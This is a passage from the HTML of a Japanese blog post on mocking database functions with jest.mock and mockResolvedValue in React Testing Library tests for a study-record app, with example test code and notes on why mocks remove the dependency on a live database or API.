class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">setup</span><span class=\"p\">();</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n    <span class=\"c1\">// 新規登録ボタンをクリック</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n    <span class=\"c1\">// タイトルを入力</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">type</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title-input</span><span class=\"dl\">\"</span><span class=\"p\">),</span> <span class=\"dl\">\"</span><span class=\"s2\">Test Title</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"c1\">// 時間を入力</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">timeInput</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">time-input</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">input</span> <span class=\"o\">=</span> <span class=\"nx\">timeInput</span><span class=\"p\">.</span><span class=\"nf\">querySelector</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">input[role=\"spinbutton\"]</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">clear</span><span class=\"p\">(</span><span class=\"nx\">input</span><span class=\"o\">!</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">type</span><span class=\"p\">(</span><span class=\"nx\">input</span><span class=\"o\">!</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">60</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\n    <span class=\"c1\">// 登録ボタンをクリック</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">submit-button</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n\n    <span class=\"c1\">// モーダルが閉じるのを待つ</span>\n    <span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">queryByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Modal Title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"c1\">// 登録されたデータが表示されることを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">Test Title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">60</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n\n</code></pre></div></div>\n<p data-sourcepos=\"102:1-103:81\">上記のテストコードでも確認することができますが、<strong>実際にDBに接続、データを登録、DBからデータを取得しないとテストコードとして成り立ちません。</strong><br>\nテストを実行する度に、レコードが登録されてしまいます。</p>\n<p data-sourcepos=\"105:1-106:105\">DBのサーバーが止まっているときや、実際の開発でまだDB接続ができないという場合もあり得ます。<br>\nその際は上記のテストコードは動かず、テストができないコードになります。</p>\n<p data-sourcepos=\"108:1-108:166\">→<strong>外部システムに依存せずテストを行う、外部システムの代わりにモックを使う</strong>とはこういうことかと理解できました。</p>\n<p data-sourcepos=\"110:1-111:66\">今回は、DBで理解しましたが、外部のAPIを利用するときなどでも使えると理解しました。<br>\n→APIが開発中で、実際のAPIの利用不可な場合など</p>\n<h1 data-sourcepos=\"113:1-113:28\">\n<span id=\"jestでのmockの使い方\" class=\"fragment\"></span><a href=\"#jest%E3%81%A7%E3%81%AEmock%E3%81%AE%E4%BD%BF%E3%81%84%E6%96%B9\"><i class=\"fa fa-link\"></i></a>Jestでのmockの使い方</h1>\n<h2 data-sourcepos=\"115:1-115:59\">\n<span id=\"1jestmock-関数を使いモック化を行う\" class=\"fragment\"></span><a href=\"#1jestmock-%E9%96%A2%E6%95%B0%E3%82%92%E4%BD%BF%E3%81%84%E3%83%A2%E3%83%83%E3%82%AF%E5%8C%96%E3%82%92%E8%A1%8C%E3%81%86\"><i class=\"fa fa-link\"></i></a>1.jest.mock(...) 関数を使い、モック化を行う</h2>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"117:1-132:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span><span class=\"p\">,</span> <span class=\"nx\">waitFor</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"hil\"><span class=\"o\">+</span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"na\">addStudyRecord</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n</span><span class=\"hil\"><span class=\"o\">+</span><span class=\"p\">}));</span>\n</span>\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">setup</span><span class=\"p\">();</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n<span class=\"o\">***</span> <span class=\"nx\">以下略</span> <span class=\"o\">***</span>\n</code></pre></div></div>\n<p data-sourcepos=\"134:1-134:114\"><strong>jest.mock(<code>モックしたいモジュールが存在するパス</code>, <code>モックするモジュールを指定</code>)</strong></p>\n<ul data-sourcepos=\"135:1-139:0\">\n<li data-sourcepos=\"135:1-136:81\">\n<code>GetAllStudyRecords: jest.fn()</code><br>\n→GetAllStudyRecordsを呼び出したときはモック（jest.fn()）を返す</li>\n<li data-sourcepos=\"137:1-139:0\">\n<code>addStudyRecord: jest.fn()</code><br>\n→addStudyRecordを呼び出したときはモック（jest.fn()）を返す</li>\n</ul>\n<p data-sourcepos=\"140:1-140:64\"><iframe id=\"qiita-embed-content__039585ad024b7cb09e6f0ddd0316a213\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__039585ad024b7cb09e6f0ddd0316a213\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fmock-function-api%23jestfnimplementation\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h2 data-sourcepos=\"142:1-142:71\">\n<span id=\"2モックしたモジュールをテストコードで使用する\" class=\"fragment\"></span><a href=\"#2%E3%83%A2%E3%83%83%E3%82%AF%E3%81%97%E3%81%9F%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%82%92%E3%83%86%E3%82%B9%E3%83%88%E3%82%B3%E3%83%BC%E3%83%89%E3%81%A7%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a>2.モックしたモジュールをテストコードで使用する</h2>\n<h3 data-sourcepos=\"144:1-144:81\">\n<span id=\"モックしたdbデータ取得処理を使い初期表示確認を行う\" class=\"fragment\"></span><a href=\"#%E3%83%A2%E3%83%83%E3%82%AF%E3%81%97%E3%81%9Fdb%E3%83%87%E3%83%BC%E3%82%BF%E5%8F%96%E5%BE%97%E5%87%A6%E7%90%86%E3%82%92%E4%BD%BF%E3%81%84%E5%88%9D%E6%9C%9F%E8%A1%A8%E7%A4%BA%E7%A2%BA%E8%AA%8D%E3%82%92%E8%A1%8C%E3%81%86\"><i class=\"fa fa-link\"></i></a>モックしたDBデータ取得処理を使い、初期表示確認を行う</h3>\n<p data-sourcepos=\"145:1-145:113\">モックしたGetAllStudyRecordを使って初期表示確認をするテストコードを作成しました。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"147:1-174:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">render</span><span class=\"p\">,</span> <span class=\"nx\">screen</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">GetAllStudyRecords</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n  <span class=\"na\">addStudyRecord</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">初期表示ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"c1\">// モックデータを準備</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">mockData</span> <span class=\"o\">=</span> <span class=\"p\">[{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">3</span> <span class=\"p\">}];</span>\n\n    <span class=\"c1\">// DBから値を取得したことにする（モックデータを返す）</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">(</span><span class=\"nx\">mockData</span><span class=\"p\">);</span>\n\n    <span class=\"c1\">// Appコンポーネントをレンダリング</span>\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n    <span class=\"c1\">//　初期表示のタイトルが存在することを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n\n    <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">debug</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<p data-sourcepos=\"176:1-176:68\"><strong><code>(GetAllStudyRecords as jest.Mock).mockResolvedValue(mockData);</code></strong></p>\n<ul data-sourcepos=\"177:1-180:0\">\n<li data-sourcepos=\"177:1-177:70\">mockResolvedValueの引数に準備したデータを指定します</li>\n<li data-sourcepos=\"178:1-180:0\">GetAllStudyRecordsを呼んだときにmockResolvedValueに指定したデータを返します</li>\n</ul>\n<p data-sourcepos=\"181:1-181:72\"><iframe id=\"qiita-embed-content__e33138d1430109ccf6be2a317fcc7989\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e33138d1430109ccf6be2a317fcc7989\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fmock-function-api%23mockfnmockresolvedvaluevalue\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"183:1-183:137\"><code>screen.debug();</code>でレンダリングされたDOMを確認するとモックデータが表示されることを確認できました。</p>\n<p data-sourcepos=\"185:1-185:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e3a7f81-19e0-4284-87f3-d1ef49a1b06e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=35b77122e03284978a9382900a462ad7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e3a7f81-19e0-4284-87f3-d1ef49a1b06e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=35b77122e03284978a9382900a462ad7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0e3a7f81-19e0-4284-87f3-d1ef49a1b06e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=91a7476b97f2aa8311b06741bb4ce846 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0e3a7f81-19e0-4284-87f3-d1ef49a1b06e.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"187:1-187:75\">\n<span id=\"モックしたdb登録処理を使いデータ登録確認を行う\" class=\"fragment\"></span><a href=\"#%E3%83%A2%E3%83%83%E3%82%AF%E3%81%97%E3%81%9Fdb%E7%99%BB%E9%8C%B2%E5%87%A6%E7%90%86%E3%82%92%E4%BD%BF%E3%81%84%E3%83%87%E3%83%BC%E3%82%BF%E7%99%BB%E9%8C%B2%E7%A2%BA%E8%AA%8D%E3%82%92%E8%A1%8C%E3%81%86\"><i class=\"fa fa-link\"></i></a>モックしたDB登録処理を使い、データ登録確認を行う</h3>\n<p data-sourcepos=\"189:1-189:110\">モックしたaddStudyRecordを使って登録処理を確認するテストコードを作成しました。</p>\n<p data-sourcepos=\"191:1-191:130\">ここで学んだことは、<strong>ユーザー操作の前に、モックの設定を行う必要がある</strong>ということです。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"193:1-261:3\"><div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span>\n  <span class=\"nx\">act</span><span class=\"p\">,</span>\n  <span class=\"nx\">queryByTestId</span><span class=\"p\">,</span>\n  <span class=\"nx\">render</span><span class=\"p\">,</span>\n  <span class=\"nx\">screen</span><span class=\"p\">,</span>\n  <span class=\"nx\">waitFor</span><span class=\"p\">,</span>\n<span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/react</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">App</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../App</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">addStudyRecord</span><span class=\"p\">,</span> <span class=\"nx\">GetAllStudyRecords</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n<span class=\"k\">import</span> <span class=\"nx\">userEvent</span> <span class=\"k\">from</span> <span class=\"dl\">\"</span><span class=\"s2\">@testing-library/user-event</span><span class=\"dl\">\"</span><span class=\"p\">;</span>\n\n<span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">mock</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">../lib/study-record</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">({</span>\n  <span class=\"na\">GetAllStudyRecords</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n  <span class=\"na\">addStudyRecord</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n  <span class=\"na\">deleteStudyRecordById</span><span class=\"p\">:</span> <span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nf\">fn</span><span class=\"p\">(),</span>\n<span class=\"p\">}));</span>\n\n<span class=\"nf\">describe</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">App</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"nf\">it</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">登録ができる</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"k\">async </span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">user</span> <span class=\"o\">=</span> <span class=\"nx\">userEvent</span><span class=\"p\">.</span><span class=\"nf\">setup</span><span class=\"p\">();</span>\n    <span class=\"c1\">// DBから値を取得(空データを返す)</span>\n    <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([]);</span>\n\n    <span class=\"nf\">render</span><span class=\"p\">(&lt;</span><span class=\"nc\">App</span> <span class=\"p\">/&gt;);</span>\n\n    <span class=\"c1\">// 表示データ(tbodyの行)がないことを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">queryByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">table-row</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nx\">not</span><span class=\"p\">.</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n\n    <span class=\"c1\">// 登録ボタンを押下</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">new-record-button</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n    <span class=\"c1\">// モーダルが表示されることを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">modal-title</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n\n    <span class=\"c1\">// フォームを入力</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">type</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">title-input</span><span class=\"dl\">\"</span><span class=\"p\">),</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">timeInput</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">time-input</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n    <span class=\"kd\">const</span> <span class=\"nx\">input</span> <span class=\"o\">=</span> <span class=\"nx\">timeInput</span><span class=\"p\">.</span><span class=\"nf\">querySelector</span><span class=\"p\">(</span><span class=\"dl\">'</span><span class=\"s1\">input[role=\"spinbutton\"]</span><span class=\"dl\">'</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">clear</span><span class=\"p\">(</span><span class=\"nx\">input</span><span class=\"o\">!</span><span class=\"p\">);</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">type</span><span class=\"p\">(</span><span class=\"nx\">input</span><span class=\"o\">!</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">60</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n\n    <span class=\"c1\">// 先にDBに登録するデータを設定し、登録したことにする</span>\n    <span class=\"p\">(</span><span class=\"nx\">addStudyRecord</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span>\n      <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">60</span> <span class=\"p\">},</span>\n    <span class=\"p\">]);</span>\n\n    <span class=\"c1\">// 登録後にDBから再取得する可能性を考慮して、事前に設定</span>\n    <span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"p\">(</span><span class=\"nx\">GetAllStudyRecords</span> <span class=\"kd\">as </span><span class=\"nx\">jest</span><span class=\"p\">.</span><span class=\"nx\">Mock</span><span class=\"p\">).</span><span class=\"nf\">mockResolvedValue</span><span class=\"p\">([</span>\n        <span class=\"p\">{</span> <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">2</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"na\">time</span><span class=\"p\">:</span> <span class=\"mi\">60</span> <span class=\"p\">},</span>\n      <span class=\"p\">]);</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"c1\">// 登録ボタン押下</span>\n    <span class=\"k\">await</span> <span class=\"nx\">user</span><span class=\"p\">.</span><span class=\"nf\">click</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByTestId</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">submit-button</span><span class=\"dl\">\"</span><span class=\"p\">));</span>\n\n    <span class=\"c1\">// addStudyRecordが呼び出されたことを確認</span>\n    <span class=\"k\">await</span> <span class=\"nf\">waitFor</span><span class=\"p\">(()</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n      <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"nx\">addStudyRecord</span><span class=\"p\">).</span><span class=\"nf\">toHaveBeenCalled</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"c1\">// テーブルに登録データが表示されることを確認</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nf\">expect</span><span class=\"p\">(</span><span class=\"k\">await</span> <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">findByText</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">60</span><span class=\"dl\">\"</span><span class=\"p\">)).</span><span class=\"nf\">toBeInTheDocument</span><span class=\"p\">();</span>\n    <span class=\"nx\">screen</span><span class=\"p\">.</span><span class=\"nf\">debug</span><span class=\"p\">();</span>\n  <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre></div></div>\n<p 